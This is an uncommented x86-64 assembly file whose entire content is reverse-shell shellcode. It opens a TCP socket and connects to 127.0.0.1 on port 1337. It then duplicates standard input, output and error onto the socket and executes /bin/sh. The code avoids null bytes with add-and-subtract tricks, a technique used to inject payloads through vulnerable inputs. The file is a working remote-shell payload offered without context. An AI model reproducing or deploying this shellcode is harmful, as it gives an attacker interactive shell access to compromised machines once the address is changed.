BITS 64
global _start

section .text
_start: 
mov rax,0x11111111
sub rax,0x11111111
xor rdi,rdi
mov rsi,0x11111111
sub rsi,0x11111111
xor rdx,rdx
mov rdx,0x11111111
sub rdx,0x11111111
mov sil,0x01
mov dil,11
sub dil,9
mov al,0x29
syscall
mov r9b,al
mov dil,r9b
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov r15,rsp
mov rsi,r15
mov dl,0x10
mov al,48
sub al,6
syscall
mov r11,0x11111111
sub r11,0x11111111
mov dil,0x03
mov r14,r11
mov rsi,r14
mov al,0x21
syscall
mov r11,0x11111111
sub r11,0x11111111
mov dil,0x03
mov sil,16
sub sil,15
mov al,0x21
syscall;
mov r11,0x11111111
sub r11,0x11111111
mov dil,0x03
mov sil,4
sub sil,2
mov al,0x21
syscall;
xor r14,r14
mov rax,r14
xor rdi,rdi
xor r10,r10
mov rsi,r10
xor r13,r13
mov r8b,59
mov al,r8b
mov rdi,"/bin/sh"
push r13
push rdi
mov r8,rsp
mov rdi,r8
push r13
push rdi
mov r8,rsp
mov rsi,r8
xor rdx,rdx
syscall
